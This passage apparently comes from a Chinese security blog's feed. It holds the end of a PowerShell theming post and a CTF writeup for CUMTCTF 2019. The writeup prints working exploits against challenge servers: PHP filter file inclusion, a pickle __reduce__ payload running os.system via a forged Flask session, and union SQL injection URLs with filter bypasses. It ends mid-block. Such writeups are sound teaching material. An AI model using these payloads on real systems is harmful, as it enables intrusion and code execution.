colortool</span><br></pre></td></tr></table></figure><p>待续</p><p><strong>颜色设置</strong></p><p>PS的字体颜色中有许多很暗的颜色的，比如在输入<code>-xxxx</code>选项是黑灰色，分辨度很差，我们可以自己修改成想要的颜色，点击”settings”，转到颜色选项卡</p><p>选择自己喜欢的颜色方案</p><p><img src="/2020/03/22/psbeautify/10.png" alt></p><p>然后下面第8个一般是暗色，这个就是控制上述选项的（我是和我shell中的颜色对比确定的），我们选择一个自己喜欢的颜色，效果如下，清楚了许多</p><p><img src="/2020/03/22/psbeautify/11.png" alt></p><p>其它颜色修改也可以参照上面的方法自己DIY，最后记得要保存成自己的颜色方案</p><h1 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h1><p><strong>cmder</strong>（该软件也有丰富的设置项，只是我没怎么搞而已，也是一个不错的软件）</p><p><img src="/2020/03/22/psbeautify/6.png" alt></p><p><strong>Fluent Terminal</strong></p><p><img src="/2020/03/22/psbeautify/7.png" alt></p><p><strong>ConEmu</strong></p><p><img src="/2020/03/22/psbeautify/8.png" alt></p><hr><p><a href="https://sspai.com/post/52868" target="_blank" rel="noopener">https://sspai.com/post/52868</a><br><a href="https://iterm2colorschemes.com/" target="_blank" rel="noopener">https://iterm2colorschemes.com/</a><br><a href="https://github.com/JanDeDobbeleer/oh-my-posh" target="_blank" rel="noopener">https://github.com/JanDeDobbeleer/oh-my-posh</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;爱美之心，人皆有之&lt;/p&gt;
    
    </summary>
    
      <category term="教程" scheme="http://chaosec.top/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="PowerShell" scheme="http://chaosec.top/tags/PowerShell/"/>
    
      <category term="美化" scheme="http://chaosec.top/tags/%E7%BE%8E%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Rootme网站做题记录(二)</title>
    <link href="http://chaosec.top/2019/08/06/rootme1/"/>
    <id>http://chaosec.top/2019/08/06/rootme1/</id>
    <published>2019-08-06T03:47:10.000Z</published>
    <updated>2020-09-13T14:40:14.546Z</updated>
    
    <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Password plz..." />    <label for="pass">Password plz...</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Rootme网站做题记录(一)</title>
    <link href="http://chaosec.top/2019/07/31/rootme/"/>
    <id>http://chaosec.top/2019/07/31/rootme/</id>
    <published>2019-07-31T09:45:39.000Z</published>
    <updated>2020-09-13T14:45:11.755Z</updated>
    
    <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="官方不建议公布wp，所以加密。可以email交流" />    <label for="pass">官方不建议公布wp，所以加密。可以email交流</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CUMTCTF第三轮月赛与决赛</title>
    <link href="http://chaosec.top/2019/05/22/cumtctf3/"/>
    <id>http://chaosec.top/2019/05/22/cumtctf3/</id>
    <published>2019-05-22T08:36:44.000Z</published>
    <updated>2020-01-05T13:03:46.155Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第三次双月赛题解"><a href="#第三次双月赛题解" class="headerlink" title="第三次双月赛题解"></a>第三次双月赛题解</h1><a id="more"></a><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="古典密码签到"><a href="#古典密码签到" class="headerlink" title="古典密码签到"></a>古典密码签到</h3><p>维吉尼亚密码，密文<code>juttaigykhpmjyreca</code>，秘钥<code>cumt</code>，在线解密即可<a href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/weijiniyamima.php</a></p><p>flag: <code>flag{hahayoufindtheflag}</code></p><h3 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h3><p>题目给出的pyc文件，在线反编译一下即可得到源代码</p><p>很简单的解密题，按照相反的逻辑解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode1</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i) ^ <span class="number">36</span></span><br><span class="line">        x = x + <span class="number">25</span></span><br><span class="line">        s += chr(x)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode2</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i) + <span class="number">36</span></span><br><span class="line">        x = x ^ <span class="number">36</span></span><br><span class="line">        s += chr(x)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode3</span><span class="params">(ans)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> base64.b32encode(ans)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">' '</span></span><br><span class="line">final = <span class="string">'LOQ2NJFYU5YH2WTUU5VHJIDXLJNVW2LQO52WS2L6PVUVW2TQLJNVSWLJUBN3E==='</span></span><br><span class="line"><span class="comment"># if encode3(encode2(encode1(flag))) == final:</span></span><br><span class="line"><span class="comment">#     print 'correct'</span></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment">#     print 'wrong'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode3</span><span class="params">(ans)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> base64.b32decode(ans)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode2</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i)</span><br><span class="line">        x = x ^ <span class="number">36</span></span><br><span class="line">        x = x - <span class="number">36</span></span><br><span class="line">        s += chr(x)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode1</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i)</span><br><span class="line">        x = x - <span class="number">25</span></span><br><span class="line">        x = x ^ <span class="number">36</span></span><br><span class="line">        s += chr(x)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line">    </span><br><span class="line"><span class="keyword">print</span> decode1(decode2(decode3(final)))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b38e7b57c2eff432044984f53efdd4cf&#125;</span><br></pre></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web签到1"><a href="#web签到1" class="headerlink" title="web签到1"></a>web签到1</h3><p>简单的文件包含即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:30100&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;cxk.php</span><br></pre></td></tr></table></figure><p>flag{CumtCTF_this_iS_a_RElLy_fLaG!!!}</p><h3 id="Web签到2"><a href="#Web签到2" class="headerlink" title="Web签到2"></a>Web签到2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">P</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $var;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(</span><br><span class="line">            <span class="string">'global '</span>.<span class="keyword">$this</span> -&gt; <span class="keyword">var</span>.<span class="string">';'</span>.</span><br><span class="line">            <span class="string">'$ret = '</span>.<span class="keyword">$this</span> -&gt; <span class="keyword">var</span>.<span class="string">';'</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $fn;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'string'</span>;</span><br><span class="line">        $fn = <span class="keyword">$this</span> -&gt; fn;</span><br><span class="line">        <span class="keyword">return</span> $fn();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">U</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $obj;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;obj-&gt;name) || <span class="keyword">$this</span>-&gt;obj-&gt;name != <span class="string">"iv4n"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; obj -&gt; fn = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> unserialize($_POST[<span class="string">'obj'</span>])-&gt;obj;</span><br></pre></td></tr></table></figure><p>flag{0k_y0u_4lr3ady_kn0w_uns3ria1ize}</p><h3 id="Baby-Flask"><a href="#Baby-Flask" class="headerlink" title="Baby Flask"></a>Baby Flask</h3><p>flask项目的网站，查看源代码可以看到github网址，给出了网站源码，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add secret key to enable session</span></span><br><span class="line"><span class="comment"># and this is a fake secret key, just an example</span></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'you_find_secret_key_congratulations'</span></span><br><span class="line"></span><br><span class="line">User = type(<span class="string">'User'</span>, (object,), &#123;</span><br><span class="line">    <span class="string">'uname'</span>: <span class="string">'test'</span>,</span><br><span class="line">    <span class="string">'is_admin'</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">'__repr__'</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=('GET',))</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">'u'</span>):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session[<span class="string">'u'</span>] = u</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/file', methods=('GET',))</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_handler</span><span class="params">()</span>:</span></span><br><span class="line">    path = request.args.get(<span class="string">'file'</span>)</span><br><span class="line">    path = os.path.join(<span class="string">'static'</span>, path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path) <span class="keyword">or</span> os.path.isdir(path) \</span><br><span class="line">            <span class="keyword">or</span> <span class="string">'.py'</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">'.sh'</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">'..'</span> <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'disallowed'</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/admin', methods=('GET',))</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_handler</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">'u'</span>)</span><br><span class="line">        print(pickle.loads(<span class="string">b'\x80\x03cprogram_main_app@@@\nUser\nq\x00)\x81q\x01.'</span>))</span><br><span class="line">        <span class="keyword">if</span> isinstance(u, dict): </span><br><span class="line">            u = b64decode(u.get(<span class="string">'b'</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'welcome, admin'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'who are you?'</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'uhh?'</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>可以看到file路由处可以进行文件读取</p><p><img src="https://i.loli.net/2019/05/04/5ccd332f17fc0.png" alt></p><p>查看历史提交记录可以看到某个版本中有如下语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.getenv(<span class="string">'secret_key'</span>)</span><br></pre></td></tr></table></figure><p>可以看到环境变量中写入了秘钥值，结合上面的文件读取漏洞，我们可以读取到该秘钥值，也可以知道用户是iv4n</p><p><img src="https://i.loli.net/2019/05/04/5ccd33cc0a86f.png" alt></p><p>读取到秘钥就可以伪造session了，查看admin的代码可以知到此处利用了pickle模块，该模块可以进行序列化操作，而且也存在反序列化漏洞，可以利用<strong>reduce</strong>方法来进行命令执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        a = <span class="string">"`ls / -l &gt; /home/iv4n/3.txt`"</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line"></span><br><span class="line">u = pickle.dumps(User())</span><br><span class="line">print(u)</span><br><span class="line">bu = base64.b64encode(u)</span><br><span class="line">print(bu)</span><br></pre></td></tr></table></figure><p>这里坑的地方在于，当时我发现这个命令执行漏洞没有回显，所以我先尝试了反弹shell，结果bash反弹失败了，此处我尝试了将命令执行的结果写入文件中，然后读取文件即可，此处需要注意的是写入文件是有权限限制的，起初我想在根目录或者项目目录中写入文件，但是都失败了，估计是权限不够，必须找一个有权限的目录才行，我们前面已经知道了项目用户是iv4n，那么我们直接写入该用户的目录下不就行了，用上面的命令输出值之后进行session伪造即可（使用base64是为了防止编码问题）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py flask_session_cookie_manager3.py encode -s you_find_secret_key_congratulations -t &#123;&#39;u&#39;:&#123;&#39;b&#39;:b&#39;gANjcG9zaXgKc3lzdGVtCnEAWD0AAABgY2F0IC9mMWxsMWxsMTQ0NGFhYWcvZjFsbDFsbDE0NDRhYWFnID4gL2hvbWUvaXY0di9ndWVzcy50eHRgcQGFcQJScQMu&#39;&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后修改cookie，刷新admin页面，然后去读文件</p><p><img src="https://i.loli.net/2019/05/04/5ccd37814e80f.png" alt></p><p>可以看到flag文件，直接读取即可</p><p><img src="https://i.loli.net/2019/05/04/5ccd37ed7cf35.png" alt></p><blockquote><p>PS：反弹shell失败的原因在于我使用的是bash反弹shell，而题目环境中没有bash而是sh，而且也没有/dev/tcp文件，可以通过fork子进程来进行反弹shell</p></blockquote><p>我走的一个弯路在于一直想以admin身份登录（虽然登录之后毛都没有），但是一直报错，记录一下自己的方法</p><p>pickle模块在序列化类的时候，是不会序列化具体值的，我们解密cookie的值为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;u&#39;:b&#39;\x80\x03cprogram_main_app@@@\nUser\nq\x00)\x81q\x01.&#39;&#125;</span><br></pre></td></tr></table></figure><p>可以看到并没有包含User的具体字段的信息，换句话说我们即使本地修改了<code>is_admin</code>的值，在服务器端反序列化之后也并没有被记录，而是直接以代码中的定义来初始化，也就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User = type(<span class="string">'User'</span>, (object,), &#123;</span><br><span class="line">    <span class="string">'uname'</span>: <span class="string">'test'</span>,</span><br><span class="line">    <span class="string">'is_admin'</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">'__repr__'</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><code>is_admin</code>又被初始化为0了，所以我们无法登陆成功，那么怎么解决这个问题呢？</p><p>我们可以通过将<code>is_admin</code>设置为类属性来解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.a = <span class="number">2</span></span><br><span class="line">        self.is_admin = <span class="number">1</span></span><br><span class="line">a=User()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line">print(c)</span><br><span class="line">print(base64.b64encode(c))</span><br><span class="line">pickle.loads(c)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#39;\x80\x03c__main__\nUser\nq\x00)\x81q\x01&#125;q\x02(X\x01\x00\x00\x00aq\x03K\x02X\x08\x00\x00\x00is_adminq\x04K\x01ub.&#39;</span><br></pre></td></tr></table></figure><p>可以看到<code>is_admin</code>被序列化了（个人理解是dump方法会序列化类的属性），然后需要注意一点，上面的输出包含<code>__mian__</code>，和我们从网站解密的对比一下</p><blockquote><p>b’\x80\x03cprogram_main_app@@@\nUser\nq\x00)\x81q\x01.’ </p></blockquote><p>同样位置是<code>program_main_app@@@</code>，这应该是模块名，如果不对应的化反序列化会失败，此处我们也需要进行相应的修改，最终如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#39;\x80\x03cprogram_main_app@@@\nq\x00)\x81q\x01&#125;q\x02(X\x01\x00\x00\x00aq\x03K\x02X\x08\x00\x00\x00is_adminq\x04K\x01ub.&#39;</span><br></pre></td></tr></table></figure><h1 id="CUMTCTF-FINAL-2019"><a href="#CUMTCTF-FINAL-2019" class="headerlink" title="CUMTCTF_FINAL_2019"></a>CUMTCTF_FINAL_2019</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="委屈的兔兔"><a href="#委屈的兔兔" class="headerlink" title="委屈的兔兔"></a>委屈的兔兔</h3><p>打开图片，查看16进制即可在尾部看到unicode编码，解码即可得到flag</p><p>key{you are right}</p><h3 id="两岁半的猪"><a href="#两岁半的猪" class="headerlink" title="两岁半的猪"></a>两岁半的猪</h3><p>拖进stegsolve就会简单移位就可以看到二维码</p><p>flag{AppLeU0}</p><h3 id="寻找你的key"><a href="#寻找你的key" class="headerlink" title="寻找你的key"></a>寻找你的key</h3><p>zip伪加密，之后是一个exe文件，拖进16进制查看发现是反向的base64图片编码，在线解码即可得到二维码，扫描可得flag</p><p>KEY{dca57f966e4e4e31fd5b15417da63269}</p><h3 id="302"><a href="#302" class="headerlink" title="302"></a>302</h3><p>抓包去掉referer头可以看到base64编码图片，解码得到图片，然后还可以看到有个key字段，值为<code>123.com</code>，然后用key值在线解密网站解密即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.atool9.com&#x2F;steganography.php</span><br></pre></td></tr></table></figure><p>flag{85bb86974a2a33bd4032ea3b7264b831}</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>md5弱比较</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$s = sanitize_user_input($_GET[<span class="string">'s'</span>]);</span><br><span class="line">    $h = secured_hash_function($_GET[<span class="string">'h'</span>]);</span><br><span class="line">    $r = gen_secured_random();</span><br><span class="line">    <span class="keyword">if</span>($s != <span class="keyword">false</span> &amp;&amp; $h != <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>($s.$r == $h) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Well done! Here is your flag: "</span>.$flag;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>因为是将$s放在前面而且允许输入数字，那我们就可以利用MD5弱比较来进行绕过，右边生成一个0e开头的纯数字md5，左边直接输入0e与后面数字拼接即可验证通过</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>测试列数，发现过滤，双写可以绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;120.78.164.84:49098&#x2F;list.php?id&#x3D;1&#39; oorrder by 4-- +</span><br></pre></td></tr></table></figure><p>测试一下过滤，发现只过滤union，select，or，然后开始正常联合注入 </p><p>数据库名ctf</p><p>爆表名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;120.78.164.84:49098&#x2F;list.php?id&#x3D;-1&#39; ununionion seselectlect 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema&#x3D;database()-- +</span><br><span class="line"></span><br><span class="line">ctf,f1ag1nit</span><br></pre></td></tr></table></figure><br>爆列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;120.78.164.84:49098&#x2F;list.php?id&#x3D;-1&#39; ununionion seselectlect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name&#x3D;&#39;f1ag1nit&#39;-- +</span><br><span class="line"></span><br><span class="line">id,flag</span><br></pre></td></tr></table></figure><p>爆flag时发现flag被过滤了，现在需要在不输入列名的情况下得到数据，百度搜索到一个方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 